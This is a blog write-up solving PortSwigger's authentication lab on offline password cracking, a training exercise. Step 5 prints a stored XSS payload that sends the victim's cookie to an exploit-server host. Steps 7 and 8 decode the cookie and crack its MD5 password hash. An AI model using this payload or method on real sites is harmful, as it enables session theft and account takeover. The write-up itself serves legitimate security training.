---
layout: post
title:  "PortSwigger - Authentication - Lab 10"
date:   2024-06-05 18:40
image:  /images/portswigger/WebSecurityAcademy.png
tags:   [authentication]
categories: [PortSwigger]
---

# Lab 10 - Offline password cracking
><b>Lab Objective:</b>
<br/><br/>
This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page.
<br/>
<br/>
`Your credentials: wiener:peter`<br/>
`Victim's username: carlos`
<br/>
<br/>
<b>Reference:</b>
<br/>
<a href="https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking">Port Swigger - Lab 10</a>
<br/>

### Solution
<hr/>

#### 1. With Burp running, use your own account to investigate the `Stay logged in` functionality. Notice that the `stay-logged-in cookie` is Base64 encoded.

#### 2. In the `Proxy > HTTP history` tab, go to the Response to your login request and highlight the `stay-logged-in` cookie, to see that it is constructed as follows: `username+':'+md5HashOfPassword`

#### 3. You now need to steal the victim user's cookie. Observe that the comment functionality is vulnerable to XSS

#### 4. Go to the exploit server and make a note of the URL.

#### 5. Go to one of the blogs and post a comment containing the following <a href="https://portswigger.net/web-security/cross-site-scripting/stored">stored XSS payload</a>, remembering to enter your own exploit server ID:
`<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>`

#### 6. On the exploit server, open the access log. There should be a `GET` request from the victim containing their `stay-logged-in` cookie

#### 7. Decode the cookie in Burp Decoder. The result will be: `carlos:26323c16d5f4dabff3bb136f2460a943`

#### 8. Copy the hash and paste it into a search engine. This will reveal that the password is `onceuponatime`

#### 9. Log in to the victim's account, go to the `My account` page, and delete their account to solve the lab.
<hr/>